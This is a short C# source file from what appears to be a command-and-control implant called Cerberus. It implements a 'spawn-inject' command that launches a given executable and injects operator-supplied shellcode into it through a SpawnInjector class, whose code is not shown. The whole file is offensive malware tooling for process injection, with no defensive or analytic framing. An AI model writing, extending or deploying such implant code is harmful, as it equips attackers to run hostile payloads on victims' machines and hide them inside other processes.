﻿using Cerberus.Internal;
using Cerberus.Models.Tasks;

namespace Cerberus.Commands
{
    public class SpawnInject : CerberusCommand
    {
        public override string Name => "spawn-inject";

        public override string Execute(CerberusTask task)
        {
            if (task.Arguments is null || task.Arguments.Length == 0)
                return "No path specified. Please specify the path to the executable you want to spawn-inject into";

            var path = task.Arguments[0];

            var injector = new SpawnInjector();
            var success = injector.Inject(task.FileBytes, 0, path);

            if (success) return "Shellcode injected";
            else return "Failed to inject shellcode";
        }
    }
}